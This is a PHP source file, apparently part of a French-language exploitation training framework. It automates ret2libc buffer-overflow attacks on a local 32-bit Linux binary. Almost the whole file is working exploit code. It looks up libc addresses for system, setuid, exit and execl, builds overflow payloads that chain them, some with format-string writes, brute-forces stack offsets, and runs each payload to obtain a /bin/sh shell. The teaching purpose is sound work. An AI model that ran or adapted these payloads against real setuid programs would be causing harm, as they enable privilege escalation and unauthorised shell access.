		[ ... ] [ addr of function1 in libc ] [ pop-pop-ret ] [arg1] [arg2] [ addr of function2 in libc ]
		eight bytes for arguments");
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&gets()\"+\"&pop_ret\"+\"&vuln_buf\"+\"&system()\"+\"&pop_ret\"+\"&vuln_buf\"+\"&exit\"+\"&vuln_buf\"'`");
	$this->pause();
	$addr_gets = $this->elf2addr4fonction_prog("gets");
	$addr_exit = $this->elf2addr4fonction_prog("exit");
	$addr_system = $this->elf2addr4fonction_prog("system");

	$addr_pop_tab = $this->elf2pop1ret4all("e?x","all");
	$addr_pop = $addr_pop_tab[0];
	
	$addr_vuln_buf = trim($this->req_ret_str("$this->file_path AA | grep buffer | grep -Po \"0x[0-9a-fA-F]{7,8}\""));
	
	 ;
	 $this->remarque("testing on new terminal in order to work");
	foreach ($addr_pop_tab as $addr_pop1 ){
	$payload = $this->payload_ret2lib4linux_gets($offset, $addr_gets, $addr_pop1, $addr_system, $addr_exit, $addr_vuln_buf);
	//$this->payload2check4norme($payload,"");
	}
	
}

function payload_ret2lib4linux_gets($offset, $gets, $pop_ret, $system, $exit, $buffer) {
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&gets()\"+\"&pop_ret\"+\"&vuln_buf\"+\"&system()\"+\"&pop_ret\"+\"&vuln_buf\"+\"&exit\"+\"&vuln_buf\"'`");
	$gets = $this->hex2norme_32($gets);
	$pop_ret = $this->hex2norme_32($pop_ret); 
	$system = $this->hex2norme_32($system);
	$exit = $this->hex2norme_32($exit);
	$buffer = $this->hex2norme_32($buffer);
	
	
	$this->article("Variables", "\n\t&gets: $gets\n\t&pop_ret: $pop_ret\n\t&system: $system\n\t&exit: $exit\n\t&vuln_buf: $buffer");
	$gets = $this->hex2rev_32($gets);
	$pop_ret = $this->hex2rev_32($pop_ret);
	$system = $this->hex2rev_32($system);
	$exit = $this->hex2rev_32($exit);
	$buffer = $this->hex2rev_32($buffer);
	
	$cmd = "python -c 'print \"A\"*$offset+\"$gets\"+\"$pop_ret\"+\"$buffer\"+\"$system\"+\"$pop_ret\"+\"$buffer\"+\"$exit\"+\"$buffer\"'";
	$query = "$this->file_path  \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	//$this->elf2debug4payload($cmd);
	return $cmd;
}


function ret2lib4linux_setuid_sprintf_ld_preload($offset) {
	$this->titre("PRELOADED a new SPRINTF Addr just for PoC");
	$this->titre("Version of Libc");
	net("http://www.gnu.org/software/libc/");
	net("ftp://ftp.funet.fi/pub/gnu/prep/libc/");
	
	$this->ssTitre("Version Libc On Localhost");
	$this->requette("ls -al `locate libc.so.6`");
	
	// source_display("$this->dir_c/my_sprintf.c");$this->requette("gcc -ggdb -m32 -shared -fPIC -ldl $this->dir_c/my_sprintf.c -o $this->dir_tmp/my_sprintf.so");$ld_preload = "my_sprintf.so";
	
	$ld_preload = "libc-2.15.so";
	$this->ssTitre("Check change sprintf addr");
	$addr_sprintf = $this->elf2addr4fonction_prog("sprintf");
	$addr_sprintf_preloaded = addr_fonction_prog_ld_preload($ld_preload, "sprintf");
	$this->pause();
	$addr_setuid = addr_fonction_prog_ld_preload($ld_preload, "setuid");
	$addr_system = addr_fonction_prog_ld_preload($ld_preload, "system");
	
	$this->titre("Addr Of NULL");
	$addr_null = trim($this->req_ret_str("LD_PRELOAD=$this->dir_tmp/$ld_preload ROPgadget --string \"\n\" --binary $this->file_path | grep '0x' | head -1 | cut -d':' -f1"));

	
	$this->titre("Utilisation d'un wrapper");
	$wrapper = prog_compile("simple_system", "-m32");
	$this->requette("ls -al $wrapper");
	shellcode_env(0, $wrapper);
	$addr_wrapper = shellcode_env_addr_ret();
	$this->pause();
	$addr_wrapper = trim($this->req_ret_str("LD_PRELOAD=$this->dir_tmp/$ld_preload $this->dir_tmp/getenv shellcode $this->file_path"));
	$addr_system_rev_raw = shellcode_hex2raw(hex_rev_32($addr_system));
	$put_env = "%2\$n" . $addr_system_rev_raw;
	fmt_env(0, $put_env);
	$this->pause();
	$addr_fm_str = fmt_env_addr_ret();
	$addr_fm_str = trim($this->req_ret_str("LD_PRELOAD=$this->dir_tmp/$ld_preload $this->dir_tmp/getenv fmt $this->file_path"));

	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"'";
	$argv_offset =($offset) + 8;
	// $stack_start = stack_start($this->file_path,$argv);$stack_end = stack_end($this->file_path,$argv);
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	// $this->requette("LD_PRELOAD=$this->dir_tmp/$ld_preload gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here = trim($this->req_ret_str("LD_PRELOAD=$this->dir_tmp/$ld_preload gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));
	$this->article("&here", $addr_here);
	$this->pause();
	$addr_here = "0xffffce2c";
	// $addr_here = "0xffffd136";
	
	$start = hexdec($addr_here) - 2000;
	$end = hexdec($addr_here) + 2000;
	$diff = $end - $start;
	
	for($i = 0, $j = $start; $j <= $end; $j ++, $i ++) {
		$this->ssTitre("Here Here+4");
		$addr_here = $j;
		$addr_here = dechex($addr_here);
		$this->article("$i/$diff", "0x$addr_here");
		$addr_here_4 = dechex(hexdec($addr_here) + 4);
		$this->payload_ret2lib4linux_setuid_sprintf("LD_PRELOAD=$this->dir_tmp/$ld_preload $this->file_path", $offset, $addr_sprintf_preloaded, $addr_setuid, $addr_here, $addr_fm_str, $addr_wrapper, $addr_here_4);
	}
	$this->pause();
}
function payload_ret2lib4linux_setuid_sprintf($offset, $addr_sprintf, $addr_setuid, $addr_here, $addr_fm_str, $addr_wrapper, $addr_null) {
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&sprintf()\"+\"&setuid()\"+\"&here1()\"+\"&(%2\$n&system())\"+\"&Wrapper\"+\"&fmt\"'`");
	
			$addr_sprintf = $this->hex2norme_32($addr_sprintf);
			$addr_setuid = $this->hex2norme_32($addr_setuid);
			$addr_here = $this->hex2norme_32($addr_here);
			$addr_fm_str = $this->hex2norme_32($addr_fm_str);
			$addr_wrapper = $this->hex2norme_32($addr_wrapper);
			$addr_null  = $this->hex2norme_32($addr_null);
	
	$this->article("Variables", "\n\t&sprintf:$addr_sprintf\n\t&setuid:$addr_setuid\n\t&here:$addr_here\n\t&fmt:$addr_fm_str\n\t&wrapper:$addr_wrapper\n\t&addr_null:$addr_null");
		
			$addr_sprintf = $this->hex2rev_32($addr_sprintf);
			$addr_setuid = $this->hex2rev_32($addr_setuid);
			$addr_here = $this->hex2rev_32($addr_here);
			$addr_fm_str = $this->hex2rev_32($addr_fm_str);
			$addr_wrapper = $this->hex2rev_32($addr_wrapper);
			$addr_null  = $this->hex2rev_32($addr_null);
			
	$cmd = "python -c 'print \"A\"*$offset+\"$addr_sprintf\"+\"$addr_setuid\"+\"$addr_here\"+\"$addr_fm_str\"+\"$addr_wrapper\"+\"$addr_null\"'";

	$query = "$this->file_path  \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	// $this->elf2debug4payload($cmd);
	return $cmd;
}
function payload_ret2lib4linux_execve_printf_fmt3_exec_familly($offset, $addr_printf, $exec_name,$addr_execl, $addr_fm_str, $addr_wrapper, $addr_cmd, $addr_here) {

	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&$exec_name()\"+\"&(%3\$n)\"+\"\\\"wrapper\\\"\"+\"\\\"cmd\\\"\"+\"&here\"'`");
			$addr_printf = $this->hex2norme_32($addr_printf);
			$addr_execl = $this->hex2norme_32($addr_execl);
			$addr_fm_str = $this->hex2norme_32($addr_fm_str);
			$addr_wrapper = $this->hex2norme_32($addr_wrapper);
			$addr_cmd = $this->hex2norme_32($addr_cmd);
			$addr_here  = $this->hex2norme_32($addr_here);
	
	$this->article("Variables", "\n\t&printf:$addr_printf\n\t&$exec_name:$addr_execl\n\t&fmt:$addr_fm_str\n\t&wrapper:$addr_wrapper\n\t&cmd:$addr_cmd\n\t&here:$addr_here");
			$addr_printf = $this->hex2rev_32($addr_printf);
			$addr_execl = $this->hex2rev_32($addr_execl);
			$addr_fm_str = $this->hex2rev_32($addr_fm_str);
			$addr_wrapper = $this->hex2rev_32($addr_wrapper);
			$addr_cmd = $this->hex2rev_32($addr_cmd);
			$addr_here  = $this->hex2rev_32($addr_here);

	$cmd = "python -c 'print \"A\"*$offset+\"$addr_printf\"+\"$addr_execl\"+\"$addr_fm_str\"+\"$addr_wrapper\"+\"$addr_cmd\"+\"$addr_here\"'";
	//$this->payload2check4norme($cmd,"\\x00\\x20\\x0a");
	$query = "$this->file_path  `$cmd`";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	//$this->elf2debug4payload($cmd);
	return $cmd;
}
function ret2lib4linux_setuid_printf_fmt3_system($offset) {
	
	$this->chapitre("LIBC PRINTF FMT3 SYSTEM");
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&pop_ret\"+\"&(%3\$n)\"+\"&setuid()\"+\"&pop_ret\"+\"&here\"+\"&system()\"+\"&exit()\"+\"&bin_sh\"'`");
	
	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \"\\x41\"*$offset+\"\\x42\\x42\\x42\\x42\"+\"\\x43\\x43\\x43\\x43\"+\"\\x44\\x44\\x44\\x44\"+\"\\x45\\x45\\x45\\x45\"+\"\\x46\\x46\\x46\\x46\"+\"\\x47\\x47\\x47\\x47\"+\"\\x48\\x48\\x48\\x48\"+\"\\x49\\x49\\x49\\x49\"+\"\\x50\\x50\\x50\\x50\"'";
	$argv_offset =($offset) + 20;
	$this->requette("echo \"b main \\nrun `$argv`\\nx/x argv[1]+$argv_offset\" > $this->dir_tmp/cmd_gdb.txt");
	$this->requette("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1");
	$addr_here = trim($this->req_ret_str("gdb --batch -q -x $this->dir_tmp/cmd_gdb.txt $this->file_path | tail -1 | cut -d':' -f1"));

	$this->article("&here", $addr_here);
	$addr_printf = $this->elf2addr4fonction_prog("printf");
	$addr_setuid = $this->elf2addr4fonction_prog("setuid");
	$addr_system = $this->elf2addr4fonction_prog("system");
	$addr_exit = $this->elf2addr4fonction_prog("exit");
	$this->id2env("FMT",0,"%3\$n");$this->pause();
	$addr_fm_str = $this->elf2addr4env("FMT");
	$addr_bin_sh = $this->elf2addr4env("SHELL");
	$this->ssTitre("POP RET in Program");

	$tab_pop_ret = $this->elf2pop1ret4all("e?x","all");
	$addr_pop_ret = $tab_pop_ret[0];


	$this->ssTitre("Brute Force Addr Here for Null on All Stack");
	$stack_start = $this->elf2stack2start($argv);
	$stack_end = $this->elf2stack2end($argv);
	$min = hexdec($stack_start);$max = hexdec($stack_end);$iter = $max-$min;
	$here_original = $stack_end;
	$this->article("MAX-MIN=ITERATION","$max-$min=$iter");$this->pause();
	//for($i=0;$i<=$iter;$i++)
	for($i=3500;$i<=4500;$i++)
	{
		$here_original_tmp = $this->addr2sub($here_original,$i);
		$this->article("ORIGINAL-$i/$iter","$here_original-$i");
	$this->payload_ret2lib4linux_setuid_printf_fmt3_system($offset, $addr_printf, $addr_pop_ret, $addr_fm_str, $addr_setuid, $here_original_tmp, $addr_system, $addr_exit, $addr_bin_sh);
	}
	$this->pause();
	
	
	$this->note("Enter Addr HERE that you have found");
	$addr_here = $this->hex2norme_32(trim(fgets(STDIN)));
	$this->article("New Addr HERE with App",$addr_here);
	$this->pause();
	
	$this->payload_ret2lib4linux_setuid_printf_fmt3_system($offset, $addr_printf, $addr_pop_ret, $addr_fm_str, $addr_setuid, $addr_here, $addr_system, $addr_exit, $addr_bin_sh);
	$this->pause();
		
}



function payload_ret2lib4linux_setuid_printf_fmt3_system($offset, $addr_printf, $addr_pop_ret, $addr_fm_str, $addr_setuid, $addr_here, $addr_system, $addr_exit, $addr_bin_sh) {
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&pop_ret\"+\"&(%3\$n)\"+\"&setuid()\"+\"&pop_ret\"+\"&here\"+\"&system()\"+\"&exit()\"+\"&bin_sh\"'`");
			$addr_printf = $this->hex2norme_32($addr_printf);
			$addr_pop_ret = $this->hex2norme_32($addr_pop_ret);
			$addr_fm_str = $this->hex2norme_32($addr_fm_str);
			$addr_setuid = $this->hex2norme_32($addr_setuid);
			$addr_here = $this->hex2norme_32($addr_here);
			$addr_system = $this->hex2norme_32($addr_system);
			$addr_exit = $this->hex2norme_32($addr_exit);
			$addr_bin_sh = $this->hex2norme_32($addr_bin_sh);

	$this->article("Variables", "\n\t&printf:$addr_printf\n\t&pop_ret:$addr_pop_ret\n\t&fmt3:$addr_fm_str\n\t&setuid:$addr_setuid\n\t&here:$addr_here\n\t&system:$addr_system\n\t&exit:$addr_exit\n\t&bin_sh:$addr_bin_sh");
			$addr_printf = $this->hex2rev_32($addr_printf);
			$addr_pop_ret = $this->hex2rev_32($addr_pop_ret);
			$addr_fm_str = $this->hex2rev_32($addr_fm_str);
			$addr_setuid = $this->hex2rev_32($addr_setuid);
			$addr_here = $this->hex2rev_32($addr_here);
			$addr_system = $this->hex2rev_32($addr_system);
			$addr_exit = $this->hex2rev_32($addr_exit);
			$addr_bin_sh = $this->hex2rev_32($addr_bin_sh);
	$cmd = "python -c 'print \"A\"*$offset+\"$addr_printf\"+\"$addr_pop_ret\"+\"$addr_fm_str\"+\"$addr_setuid\"+\"$addr_pop_ret\"+\"$addr_here\"+\"$addr_system\"+\"$addr_exit\"+\"$addr_bin_sh\"'";
	//$this->payload2check4norme($cmd,"\\x00\\x20\\x0a");
	$query = "$this->file_path  \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	// $this->elf2debug4payload($cmd);
	return $cmd;
}
function payload_ret2lib4linux_setuid_printf_fmt3_execl($offset, $addr_printf, $addr_execl, $addr_fm_str, $addr_wrapper,$addr_cmd, $addr_here) {
	
			$addr_printf = $this->hex2norme_32($addr_printf);
			$addr_execl = $this->hex2norme_32($addr_execl);
			$addr_fm_str = $this->hex2norme_32($addr_fm_str);
			$addr_wrapper = $this->hex2norme_32($addr_wrapper);
			$addr_cmd = $this->hex2norme_32($addr_cmd);
			$addr_here  = $this->hex2norme_32($addr_here);
			
			
	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"&printf()\"+\"&execl()\"+\"&FMT\"+\"\\\"exec_file_path\\\"\"+\"\\\"argv_exec_file_path\\\"\"+\"&Here4NULL\"'`");
	$this->article("Variables", "\n\t&printf:$addr_printf\n\t&execl:$addr_execl\n\t&fmt:$addr_fm_str\n\t&wrapper:$addr_wrapper\n\t&cmd:$addr_cmd\n\t&here:$addr_here");
			$addr_printf = $this->hex2rev_32($addr_printf);
			$addr_execl = $this->hex2rev_32($addr_execl);
			$addr_fm_str = $this->hex2rev_32($addr_fm_str);
			$addr_wrapper = $this->hex2rev_32($addr_wrapper);
			$addr_cmd = $this->hex2rev_32($addr_cmd);
			$addr_here  = $this->hex2rev_32($addr_here);
	$cmd = "python -c 'print \"A\"*$offset+\"$addr_printf\"+\"$addr_execl\"+\"$addr_fm_str\"+\"$addr_wrapper\"+\"$addr_cmd\"+\"$addr_here\"'";
	
	$query = "$this->file_path  \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	// $this->elf2debug4payload($cmd);
	return $cmd;
}


function payload_ret2lib4linux_setuid_intro($offset, $addr_setuid, $addr_system, $argv_setuid, $argv_system) {
			$addr_setuid = $this->hex2norme_32($addr_setuid);
			$addr_system = $this->hex2norme_32($addr_system);
			$argv_setuid = $this->hex2norme_32($argv_setuid);
			$argv_system  = $this->hex2norme_32($argv_system);

	$this->article("template", "$this->file_path `python -c 'print \"ANYTHING\"*(Offset EIP=$offset)+\"Addr setuid()\"+\"Addr system()\"+\"Argv setuid()\"+\"Argv system()\"'`");
	$this->article("Variables", "\n\t&setuid:$addr_setuid\n\t&system:$addr_system\n\targv setuid:$argv_setuid\n\targv system:$argv_system");
			$addr_setuid = $this->hex2rev_32($addr_setuid);
			$addr_system = $this->hex2rev_32($addr_system);
			$argv_setuid = $this->hex2rev_32($argv_setuid);
			$argv_system  = $this->hex2rev_32($argv_system);
	$cmd = "python -c 'print \"A\"*$offset+\"$addr_setuid\"+\"$addr_system\"+\"$argv_setuid\"+\"$argv_system\"'";
	//$this->payload2check4norme($cmd,"\\x00\\x20\\x0a");
	$query = "$this->file_path  \$($cmd)";
	//$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	//$this->elf2debug4payload($cmd);
	return $cmd;
}


function payload_ret2lib4linux_system_exit_cmd_string($system, $exit, $cmd, $offset) {
	//list($system, $exit, $cmd) = array_map($this->hex2norme_32, array($system,$exit,$cmd));
	$system = $this->hex2norme_32($system);
	$exit = $this->hex2norme_32($exit);
	$cmd = $this->hex2norme_32($cmd);
	
	$this->article("Template","NOTHING x (Offset EIP=$offset) +  &system + &exit + &CMD");
	$this->article("Variables", "\n\t&system: $system\n\t&exit: $exit\n\t&cmd: $cmd");
	// addr_string_content_display_large($cmd);
	//list($system, $exit, $cmd) = array_map("$this->hex2rev_32", array($system,$exit,$cmd));
	$system = $this->hex2rev_32($system);
	$exit = $this->hex2rev_32($exit);
	$cmd = $this->hex2rev_32($cmd);
	$payload = "python -c 'print \"A\"*$offset+\"$system\"+\"$exit\"+\"$cmd\"'";

	$query = "$this->file_path  \$($payload)";
	$this->payload2check4norme($payload, "");
	$this->requette($query);
	//$this->elf2debug4payload($payload);
	return $cmd;
}

function payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $esp_val_8, $cmd, $offset) {	
	//list($system, $exit, $esp_val_8) = array_map("$this->hex2norme_32", array($system,$exit,$esp_val_8));
	$system = $this->hex2norme_32($system);
	$exit = $this->hex2norme_32($exit);
	$esp_val_8 = $this->hex2norme_32($esp_val_8);
	
	$this->article("Variables", "\n\t&system: $system\n\t&exit: $exit\n\t&Jump: $esp_val_8\n\tstring cmd: $cmd");
	$gdb_symbol = "info symbol $esp_val_8\nx/2s $esp_val_8";
	//list($system, $exit, $esp_val_8) = array_map("$this->hex2rev_32", array($system,$exit,$esp_val_8));
	$system = $this->hex2rev_32($system);
	$exit = $this->hex2rev_32($exit);
	$esp_val_8 = $this->hex2rev_32($esp_val_8);
	
	$cmd = "python -c 'print \"A\"*$offset+\"$system\"+\"$exit\"+\"$esp_val_8\"+\"$cmd\"'";
	$query = "$this->file_path \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	return $cmd;
}


function payload_ret2lib4linux_system_exit_cmd_string_more($system, $exit, $offset_eip) {
	$this->titre("Find More &CMD");
	$this->note("pour le sh lorsqu'on utilise la ld-linux+libc, y'en a qui ne fonctionne pas la cause est qu'on doit avoir \0 a la fin d'ou le shutdown ne fonctionne pas -> faire la demonstartion en affichant la suite dans laddr x/s 0xsh donc refaire le sh avec \"sh\" en laissant le petit espace");
	$this->elf2addr4shell();
	$shells = $this->elf2addr4bin_sh_all();
	foreach($shells as $shell)
		if(! empty(trim($shell))) {
			$this->elf2addr4string_content_display_large($shell);
			$this->payload_ret2lib4linux_system_exit_cmd_string($system, $exit, $shell, $offset_eip);
		}
	$this->pause();
}


function ret2lib4linux_methode1($offset_eip, $arch) {
	$this->ssTitre("Methode 1");
	echo $this->map(8);
	$this->pause();
	$this->img("$this->dir_img/bof/libc_system_exit_bin_sh.png");
	$this->titre("Find compostants addr from Payload -> &system &exit &cmd");
	$dlls = $this->elf2dlls();
	$system = $this->elf2addr4fonction_prog("system");
	$exit = $this->elf2addr4fonction_prog("exit");
	$libc = $dlls[1];
	$libc = trim($libc);
	$this->titre("Addr /bin/sh");
	$this->question("is there a /bin/sh in $libc ?");
	$file_libc = new bin($libc);
	$file_libc->bin2content_strings("| grep \"/bin/sh\"");
	$bin_sh = $this->elf2addr4bin_sh_only();
	$this->elf2addr4content_strings($bin_sh, "AA");
	$this->pause();
	$this->requette("gdb --batch -q -ex \"r AA\" -ex \"x/8c $bin_sh\" $this->file_path | tail -1");
	$this->important("look \"0 '\\000'\" at the end");
	$this->titre("Output not clean");
	$this->ssTitre("Payload: NOTHING x OFFSET +  &system + BBBB + &CMD");
	$payload = $this->payload_ret2lib4linux_system_exit_cmd_string($system, "0x42424242", $bin_sh, $offset_eip);

	
	$this->titre("Output clean");
	$this->article("Output clean", "means we don't have -> Segmentation fault(core dumped) -> add &exit");
	$this->article("Template","NOTHING x (Offset EIP=$offset) +  &system + &exit + &CMD");
	$this->payload_ret2lib4linux_system_exit_cmd_string($system, $exit, $bin_sh, $offset_eip);

	$this->question("is there Other CMD ?");
	$this->payload_ret2lib4linux_system_exit_cmd_string_more($system, $exit, $offset_eip);
	$this->pause();
	
	$this->question("is there Other Exit Function ?");
	$tab_exit = $this->req_ret_tab("objdump -d $this->lib_linux_libc_32 | grep -i 'exit' | grep -i -Po \"<[a-z_]*@\" | grep -Po -i \"[a-z_]*\" | sort -u ");
	$this->pause();
	foreach ($tab_exit as $exit_str){
	$this->ssTitre("Payload: NOTHING x OFFSET +  &system + &$exit_str + &CMD");
	$addr_exit = $this->elf2addr4fonction_prog("$exit_str");
	$this->payload_ret2lib4linux_system_exit_cmd_string($system, $addr_exit, $bin_sh, $offset_eip);
	}
	
	
	//graphic_payload_ret2lib4linux_methode1_system_exit_cmd_string();

}


function ret2lib4linux_methode2($offset_eip) {
	
	
	$this->titre("Methode 2 Jump 2 CMD_string");
	echo $this->map(7);
	$this->pause();
	$this->img("$this->dir_img/bof/libc_payload2.png");
	//graphic_payload_ret2lib4linux_methode2_system_exit_cmd_addr();
	$this->pause();
	$this->ssTitre("Addr System");$system = $this->elf2addr4fonction_prog("system");
	$this->ssTitre("Addr Exit");$exit = $this->elf2addr4fonction_prog("exit");
	$this->ssTitre("Found Addr Here");
	$argv = "python -c 'print \\\"\\x41\\\"*$offset_eip+\\\"\\x42\\x42\\x42\\x42\\\"+\\\"\\x43\\x43\\x43\\x43\\\"+\\\"\\x44\\x44\\x44\\x44\\\"+\\\"\\x45\\x45\\x45\\x45\\\"'";
	$argv_offset =($offset_eip) + 12;
	

	$addr_here =  trim($this->req_ret_str(("gdb --batch -q -ex 'b main' -ex \"run `$argv`\" -ex \"x/x argv[1]+$argv_offset\" $this->file_path | tail -1 | cut -d':' -f1")));
	$this->article("&here", $addr_here);
	$this->note("After This -> enter exit");
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $addr_here, "bash", $offset_eip);
	$this->pause();
	
	$this->ssTitre("Jump until &CMD String");
	$this->ssTitre("Reperer le bon JUMP");
	$this->important("pas celui avec gdb mais le direct avec le programme");
	$query_argv = "gdb --batch -q -ex \"b main\" -ex \"r `python -c 'print \"A\"*$offset_eip+\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"'`\" -ex \"i r esp\" $this->file_path  | tail -1";
	$esp  = trim($this->req_ret_str("$query_argv | cut -d'x' -f3"));
	$esp = $this->hex2norme_32($esp);
	$this->pause();
	
	for($i = -200; $i < 200; $i ++) {
		$jump = dechex(hexdec($esp) + $i);
		//$jump = dechex(hexdec($addr_here) + $i);
		$this->article("+jump", "$esp + $i = $jump");
		$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "sh", $offset_eip);
		echo "\n\n";
	}
	$this->pause();
	$this->important("Inserer le bon jump dans le code source " . __FILE__ . " a la ligne " . __LINE__ . " +1");
	//$jump_app =  "0xffffcd24"; // Labs Workspace // "0xffffcd18"; // Laptop MSI //
	$jump_app = "0xffffce34";
	$jump_gdb = "0xffffd037";
	$this->note("Enter Addr JUMP that you have found");
	$jump_app = trim(fgets(STDIN));
	
	$jump_app = $this->hex2norme_32($jump_app);
	$this->article("New Addr HERE Jump",$jump_app);
	
	$this->pause();
	$jump = $jump_app;

	
	$this->titre("FOR 2 chars size of cmd");
	$this->ssTitre("ls");
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "ls", $offset_eip);
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "sh", $offset_eip);
	$this->file_raw2hex("sh");
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "\\x73\\x68", $offset_eip);
	$this->pause();
	
	// $jump = $this->addr2add($jump_app,1); // parfois pas besoin -> alignement dans la stack 
	$this->titre("FOR 3 chars size of cmd");
	$this->ssTitre("pwd");
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "pwd", $offset_eip);
	$this->pause();
	
	//$jump = $this->addr2add($jump_app,2);  // parfois pas besoin -> alignement dans la stack 
	$this->titre("FOR 4 chars size of cmd");
	$this->titre("CMD by String -> not by addresse"); // cela fonctionnait bien avec &esp +8 - sans alignement
	$this->ssTitre("Date");
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "date", $offset_eip);
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "bash", $offset_eip);
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "rbash", $offset_eip);
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "/bin/rbash", $offset_eip);
	
	$this->file_raw2hex("bash");
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "\\x62\\x61\\x73\\x68", $offset_eip);
	$this->pause();

	//$jump = $this->addr2add($jump_app,8); // parfois pas besoin -> alignement dans la stack 
	$this->titre("FOR 8 chars size of cmd");
	$this->ssTitre("Shell by /bin/sh String :");
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "/bin/sh", $offset_eip);
	$this->pause();
	$this->ssTitre("Shell by /bin/sh HEX :");
	$this->file_raw2hex("/bin/sh");
	$this->payload_ret2lib4linux_methode2_system_exit_cmd_addr($system, $exit, $jump, "\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68", $offset_eip);
    $this->pause();
	

	
	$this->titre("END ".__FUNCTION__);
}




}
// ###############################################################################################

?>